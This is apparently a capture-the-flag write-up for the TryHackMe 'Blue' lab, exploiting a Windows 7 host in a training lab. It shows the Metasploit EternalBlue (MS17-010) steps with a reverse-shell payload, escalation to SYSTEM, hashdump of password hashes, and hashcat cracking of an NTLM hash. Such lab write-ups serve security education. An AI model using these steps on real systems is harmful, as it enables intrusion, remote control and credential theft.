<p align="center">
  THM : Blue<br>
  <img src="https://i.imgur.com/ga1vRZp.png">
</p>


## Summary
- [NMAP Scan](#nmap-scan)
- [Gain access](#gain-access)
- [Privilege Escalation](#privilege-escalation)
- [Password crack](#password-crack)
- [Find flags](#find-flags)
- [Conclusion](#conclusion)

## NMAP Scan
First, I scan the machine using```nmap -A -Pn -oN nmapResults 10.10.123.84```  
```
# Nmap 7.92 scan initiated Wed Jul  6 13:06:01 2022 as: nmap -A -Pn -oN nmapResults 10.10.123.84
Nmap scan report for 10.10.123.84
Host is up (0.092s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2022-07-06T11:07:33+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2022-07-05T11:02:14
|_Not valid after:  2023-01-04T11:02:14
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2022-07-06T11:07:27+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 59m59s, deviation: 2h14m10s, median: -1s
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:f9:fa:a6:df:b5 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-07-06T11:07:27
|_  start_date: 2022-07-06T11:02:13
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-07-06T06:07:27-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  6 13:07:33 2022 -- 1 IP address (1 host up) scanned in 91.78 seconds
```  
**How many ports are open with a port number under 1000 ?**  
Answer : 3

**What is this machine vulnerable to ? (Answer in the form of: ms??-???, ex: ms08-067)**  
We see that port 139 and 445 are open, it means that we can communicate with the SMB protocol to the machine. You can see [here](https://fr.wikipedia.org/wiki/Server_Message_Block) what is this protocol and its purpose.
If we search for "Windows 7 SMB vulnerability", we find a vulnerability named [EternalBlue](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/).
We can now answer this question : ms17-010

## Gain access
For this task, we are going to use metasploit (like asked by the author of this room).
To start [Metasploit](https://www.metasploit.com/), we have to use ```msfconsole``` in a terminal.  
![alt text](https://i.imgur.com/d8hRjPL.png)  


**Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)**  
To find an exploit on msfconsole, we use ```search```, so here, we use ```search EternalBlue```. It gives us a list of exploits, we will use the first one of the list.   
![alt text](https://i.imgur.com/gr1Cypk.png)  


We can now answer the question : exploit/windows/smb/ms17_010_eternalblue  
To use this exploit, we just need to type ```use 0```, to use the exploit shown at index 0 on the list. When we select an exploit that needs a payload, msfconsole will automatically select a default payload.  

**Show options and set the one required value. What is the name of this value ? (All caps for submission)**  
To show options of the current exploit, we just need to type ```show options```, it's easy to use right ?
![alt text](https://i.imgur.com/Q9jMA6E.png)  

The answer is : RHOSTS (But we also have to change the LHOST option to use tun0 interface instead of eth0 interface).
So we use ```set RHOSTS 10.10.123.84``` to specify the target, and ```set LHOST 10.X.X.X``` with our own address on tun0 interface to get the reverse shell.

It is asked to use a specific payload with ```set payload windows/x64/shell/reverse_tcp```.  
Now we can run the exploit by using ```run```.
![alt text](https://i.imgur.com/jcCagRL.png)  

Now we have a reverse shell ! It is asked to background the shell using CTRL+Z.

## Privilege Escalation
**If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use ? (Exact path, similar to the exploit we previously selected)**  
I found [this web page](https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646) that explain how to convert our shell to a meterpreter, we will use the post module  
```post/multi/manage/shell_to_meterpreter```.  
So the answer is : post/multi/manage/shell_to_meterpreter  
Let's type ```use post/multi/manage/shell_to_meterpreter```.  


**Select this (use MODULE_PATH). Show options, what option are we required to change ?**  
Now we can see the options of the module by typing ```show options``` again.  
![alt text](https://i.imgur.com/kcbpBqQ.png)  


The answer is : SESSION  

To know what sessions are running, we use ```sessions -l```.  
![alt text](https://i.imgur.com/MNwj6il.png)  


After that, we just have to use ```set SESSION 1```, where 1 is the ID of the running session.  
Now, we can run the post module to convert our shell to a meterpreter with ```run```.  

If we list sessions again, we see that we have 1 more session.  
![alt text](https://i.imgur.com/XB9IjTz.png)  


Now we just have to select the meterpreter session by using ```sessions 2```.
We can type ```help``` to have a list of commands available with the meterpreter.
```
meterpreter > help

Core Commands
=============

    Command                   Description
    -------                   -----------
    ?                         Help menu
    background                Backgrounds the current session
    bg                        Alias for background
    bgkill                    Kills a background meterpreter script
    bglist                    Lists running background scripts
    bgrun                     Executes a meterpreter script as a background thread
    channel                   Displays information or control active channels
    close                     Closes a channel
    detach                    Detach the meterpreter session (for http/https)
    disable_unicode_encoding  Disables encoding of unicode strings
    enable_unicode_encoding   Enables encoding of unicode strings
    exit                      Terminate the meterpreter session
    get_timeouts              Get the current session timeout values
    guid                      Get the session GUID
    help                      Help menu
    info                      Displays information about a Post module
    irb                       Open an interactive Ruby shell on the current session
    load                      Load one or more meterpreter extensions
    machine_id                Get the MSF ID of the machine attached to the session
    migrate                   Migrate the server to another process
    pivot                     Manage pivot listeners
    pry                       Open the Pry debugger on the current session
    quit                      Terminate the meterpreter session
    read                      Reads data from a channel
    resource                  Run the commands stored in a file
    run                       Executes a meterpreter script or Post module
    secure                    (Re)Negotiate TLV packet encryption on the session
    sessions                  Quickly switch to another session
    set_timeouts              Set the current session timeout values
    sleep                     Force Meterpreter to go quiet, then re-establish session
    ssl_verify                Modify the SSL certificate verification setting
    transport                 Manage the transport mechanisms
    use                       Deprecated alias for "load"
    uuid                      Get the UUID for the current session
    write                     Writes data to a channel


Stdapi: File system Commands
============================

    Command       Description
    -------       -----------
    cat           Read the contents of a file to the screen
    cd            Change directory
    checksum      Retrieve the checksum of a file
    cp            Copy source to destination
    del           Delete the specified file
    dir           List files (alias for ls)
    download      Download a file or directory
    edit          Edit a file
    getlwd        Print local working directory
    getwd         Print working directory
    lcat          Read the contents of a local file to the screen
    lcd           Change local working directory
    lls           List local files
    lpwd          Print local working directory
    ls            List files
    mkdir         Make directory
    mv            Move source to destination
    pwd           Print working directory
    rm            Delete the specified file
    rmdir         Remove directory
    search        Search for files
    show_mount    List all mount points/logical drives
    upload        Upload a file or directory


Stdapi: Networking Commands
===========================

    Command       Description
    -------       -----------
    arp           Display the host ARP cache
    getproxy      Display the current proxy configuration
    ifconfig      Display interfaces
    ipconfig      Display interfaces
    netstat       Display the network connections
    portfwd       Forward a local port to a remote service
    resolve       Resolve a set of host names on the target
    route         View and modify the routing table


Stdapi: System Commands
=======================

    Command       Description
    -------       -----------
    clearev       Clear the event log
    drop_token    Relinquishes any active impersonation token.
    execute       Execute a command
    getenv        Get one or more environment variable values
    getpid        Get the current process identifier
    getprivs      Attempt to enable all privileges available to the current process
    getsid        Get the SID of the user that the server is running as
    getuid        Get the user that the server is running as
    kill          Terminate a process
    localtime     Displays the target system local date and time
    pgrep         Filter processes by name
    pkill         Terminate processes by name
    ps            List running processes
    reboot        Reboots the remote computer
    reg           Modify and interact with the remote registry
    rev2self      Calls RevertToSelf() on the remote machine
    shell         Drop into a system command shell
    shutdown      Shuts down the remote computer
    steal_token   Attempts to steal an impersonation token from the target process
    suspend       Suspends or resumes a list of processes
    sysinfo       Gets information about the remote system, such as OS


Stdapi: User interface Commands
===============================

    Command        Description
    -------        -----------
    enumdesktops   List all accessible desktops and window stations
    getdesktop     Get the current meterpreter desktop
    idletime       Returns the number of seconds the remote user has been idle
    keyboard_send  Send keystrokes
    keyevent       Send key events
    keyscan_dump   Dump the keystroke buffer
    keyscan_start  Start capturing keystrokes
    keyscan_stop   Stop capturing keystrokes
    mouse          Send mouse events
    screenshare    Watch the remote user desktop in real time
    screenshot     Grab a screenshot of the interactive desktop
    setdesktop     Change the meterpreters current desktop
    uictl          Control some of the user interface components


Stdapi: Webcam Commands
=======================

    Command        Description
    -------        -----------
    record_mic     Record audio from the default microphone for X seconds
    webcam_chat    Start a video chat
    webcam_list    List webcams
    webcam_snap    Take a snapshot from the specified webcam
    webcam_stream  Play a video stream from the specified webcam


Stdapi: Audio Output Commands
=============================

    Command       Description
    -------       -----------
    play          play a waveform audio file (.wav) on the target system


Priv: Elevate Commands
======================

    Command       Description
    -------       -----------
    getsystem     Attempt to elevate your privilege to that of local system.


Priv: Password database Commands
================================

    Command       Description
    -------       -----------
    hashdump      Dumps the contents of the SAM database


Priv: Timestomp Commands
========================

    Command       Description
    -------       -----------
    timestomp     Manipulate file MACE attributes

meterpreter > 
```
It is possible to verify that we have escalated to SYSTEM user by using ```getsystem```.  
![alt text](https://i.imgur.com/4o3fMF0.png)  

Like said in the room's question : "Just because we are system doesn't mean our process is". So we need to migrate to a process that is running as SYSTEM.
First, let's check the process list with ```ps```.  
![alt text](https://i.imgur.com/VtFZ4rQ.png)  

We just have to use a process running as SYSTEM, so for exemple, let's take process 2060 (spoolsv.exe).  
So let's type ```migrate 2060```.  
![alt text](https://i.imgur.com/RLwWRtE.png)  

## Password crack
**Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user ?**  
![alt text](https://i.imgur.com/ac3VQNT.png)  


So we use ```hashdump``` to dump user's password hashes of the machine.
Answer : Jon  

Let's copy the password hash of user Jon and crack it. 
First, we need to know what hash type is it. I use this [Hash Identifier](https://hashes.com/en/tools/hash_identifier).  
In this case, the hash identifier found the corresponding password to the given hash.  If it doesn't find it, we can try using [hashcat](https://hashcat.net/hashcat/).
Let's write the hash into a file with ```echo 'ffb43f0de35be4d9917ac0cc8ad57f8d' > hash.txt```.  
Now we can try to crack the password hash using the rockyou.txt well known wordlist. We know that the hash type is NTLM.
Lets type ```hashcat -a 0 -m 1000 hash.txt /usr/share/wordlists/rockyou.txt```.
![alt text](https://i.imgur.com/9vyv1Sg.png)  


And we successfuly cracked the hash !  


**Copy this password hash to a file and research how to crack it. What is the cracked password ?**  
Answer : *hidden* (Just do it by yourself)

## Find flags
Now let's find the flags !
**Flag1 ? This flag can be found at the system root.**  
By default, the system's root on windows is located in C: , so let's move to this directory and list the files.  
```
meterpreter > ls
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:36 +0100  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 07:08:56 +0200  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 05:20:08 +0200  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-17 23:22:01 +0100  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-17 23:28:38 +0100  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-17 23:35:57 +0100  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 04:13:22 +0100  Recovery
040777/rwxrwxrwx  4096   dir   2022-07-06 13:38:44 +0200  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 04:13:28 +0100  Users
040777/rwxrwxrwx  16384  dir   2019-03-17 23:36:30 +0100  Windows
100666/rw-rw-rw-  24     fil   2019-03-17 20:27:21 +0100  flag1.txt
000000/---------  0      fif   1970-01-01 01:00:00 +0100  hiberfil.sys
000000/---------  0      fif   1970-01-01 01:00:00 +0100  pagefile.sys
```
And there is the flag ! Just use ```cat flag1.txt```.

Answer : *hidden* (Just do it by yourself)

**Flag 2 ? This flag can be found at the location where passwords are stored within Windows.**  
I looked where the passwords are stored and I found the answer [here](https://superuser.com/questions/367579/where-are-windows-7-passwords-stored).  
So let's move to ```C:/windows/system32/config``` and then list the files.  
```
meterpreter > ls
Listing: C:\windows\system32\config
===================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  28672     fil   2018-12-13 00:00:40 +0100  BCD-Template
100666/rw-rw-rw-  25600     fil   2018-12-13 00:00:40 +0100  BCD-Template.LOG
100666/rw-rw-rw-  18087936  fil   2022-07-06 13:13:55 +0200  COMPONENTS
100666/rw-rw-rw-  1024      fil   2011-04-12 10:32:10 +0200  COMPONENTS.LOG
...
...
...
100666/rw-rw-rw-  524288    fil   2019-03-17 23:21:22 +0100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000001.regtrans-ms
100666/rw-rw-rw-  524288    fil   2019-03-17 23:21:22 +0100  SYSTEM{016888cd-6c6f-11de-8d1d-001e0bcde3ec}.TMContainer00000000000000000002.regtrans-ms
040777/rwxrwxrwx  4096      dir   2018-12-13 00:03:05 +0100  TxR
100666/rw-rw-rw-  34        fil   2019-03-17 20:32:48 +0100  flag2.txt
040777/rwxrwxrwx  4096      dir   2010-11-21 03:41:37 +0100  systemprofile
```

There is the flag 2 ! Again, just use cat to read the flag2.txt file.  
Answer : *hidden* (Just do it by yourself)  


**Flag3 ? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved.**  
The first place I looked was C:/Users/Jon/Desktop/ but there is no flag here. So I looked in C:/Users/Jon/Documents and there is the flag !
Just use cat to read the flag3.txt file.  
Answer : *hidden* (Just do it by yourself)

## Conclusion
This room was made to introduce us to pentesting on a windows machine. For me, the port scanning and the exploit research part is the same as on linux machine. 
But the privilege escalation part is very different. It's the first time I do pentest on a windows machine. Thanks for reading my write up ! 
